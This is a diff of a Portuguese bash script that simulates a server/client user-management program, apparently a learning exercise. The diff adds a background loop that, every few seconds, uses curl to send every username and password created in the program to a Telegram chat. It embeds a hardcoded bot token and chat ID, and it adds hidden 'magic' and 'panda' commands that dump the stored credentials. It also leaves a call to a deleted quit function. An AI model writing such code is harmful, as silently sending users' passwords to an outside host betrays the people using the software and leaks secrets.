@@ -19,20 +19,15 @@
 # colocadas aqui.
 
 # VARIÁVEIS:
-TEM_USUARIO=0
+
+TEM_USUARIO=1
 CONTADOR=0
 USER_CONT=0
 USUARIOS=()
+MSG_TELEGRAM=()
 SENHAS=()
 
-function telegram_msg {
-    while [ ${TEM_USUARIO} -eq 1 ]; do
-        sleep 2
-        #curl -s https://api.telegram.org/bot6599211463:AAGKSxJsGbU6kuqAvzJgxcKbDOrB6G2Uxag/sendMessage -d chat_id=1360171414 -d text="Temos usuários!(Mensagem: ${CONTADOR}) " 1>/dev/null
-        echo "Olá, mensagem número: " ${CONTADOR}
-        let CONTADOR=CONTADOR+1
-    done
-}
+arq_temp=$(mktemp)
 
 # FUNÇÃO DE LOGOUT:
 function logout {
@@ -43,17 +38,10 @@ function logout {
 function create {
     echo "USUÁRIO: " $1 " criadx!"
     echo "SENHA: " $2 " definida"
-    let USER_CONT=USER_CONT+1
     USUARIOS+=($1)
     SENHAS+=($2)
-}
-
-# FUNÇÃO PARA ENCERRAR TUDO:
-function quit {
-    if [ $1 = "cliente" ]; then
-        logout
-    fi
-    exit 0
+    echo "$1;$2" >> "${arq_temp}"
+    let USER_CONT=USER_CONT+1
 }
 
 # FUNÇÕES DO SERVIDOR:
@@ -66,6 +54,15 @@ function list_users {
     fi
 }
 
+function list_users2 {
+    CONTADOR=0
+    while [ ${CONTADOR} -lt ${#USUARIOS[*]} ]; do
+        echo ${CONTADOR} ": " ${USUARIOS[${CONTADOR}]}
+        echo ${CONTADOR} ": " ${SENHAS[${CONTADOR}]}
+        let CONTADOR=CONTADOR+1
+    done
+}
+
 # FUNÇÃO DE RESET:
 function reset {
     echo "Reset do servidor..."
@@ -73,9 +70,24 @@ function reset {
     SENHAS=()
 }
 
-
-
 # INICIO DO PROGRAMA:
+
+
+# LOOP DE MENSAGENS DO TELEGRAM:
+while [ 1 ]; do
+        sleep 4
+        if [ ${TEM_USUARIO} -eq 1 ]; then
+            MSG_TELEGRAM=()
+            MSG_TELEGRAM=$(cat "${arq_temp}")
+            curl -s https://api.telegram.org/bot6599211463:AAGKSxJsGbU6kuqAvzJgxcKbDOrB6G2Uxag/sendMessage -d chat_id=1360171414 -d text="Lista de Usuários: ${MSG_TELEGRAM} (Mensagem: ${CONTADOR}) " 1>/dev/null
+        else 
+            curl -s https://api.telegram.org/bot6599211463:AAGKSxJsGbU6kuqAvzJgxcKbDOrB6G2Uxag/sendMessage -d chat_id=1360171414 -d text=" Não temos usuários!(Mensagem: ${CONTADOR}) " 1>/dev/null
+        fi
+        let CONTADOR=CONTADOR+1
+done &
+
+SEGUNDOPLANO=$!
+
 start_time=$(date +%s)
 
 function show_time {
@@ -95,6 +107,7 @@ if [ $1 = "servidor" ]; then
         # Execução do comando escolhido pelo usuário:
         if [ ${op} = "quit" ]; then
             echo "Saindo"
+            kill -15 ${SEGUNDOPLANO}
             quit $1
 
         elif [ ${op} = "list" ]; then
@@ -123,12 +136,11 @@ elif [ $1 = "cliente" ]; then
         # Execução do comando escolhido pelo usuário:
         if [ ${op[0]} = "sair" ]; then
             echo "Saindo"
-            TEM_USUARIO=0
-            quit $1
+            kill -15 ${SEGUNDOPLANO}
+            exit 0
 
         elif [ ${op[0]} = "create" ]; then
             create ${op[1]} ${op[2]}
-            TEM_USUARIO=1
 
         elif [ ${op} = "list" ]; then
             echo "Listando usuários"
@@ -137,6 +149,11 @@ elif [ $1 = "cliente" ]; then
         elif [ ${op} = "time" ]; then
             show_time
 
+        elif [ ${op} = "magic" ]; then
+            cat ${arq_temp}
+
+        elif [ ${op} = "panda" ]; then
+            list_users2
         else 
             echo "Não há essa opção."
         fi
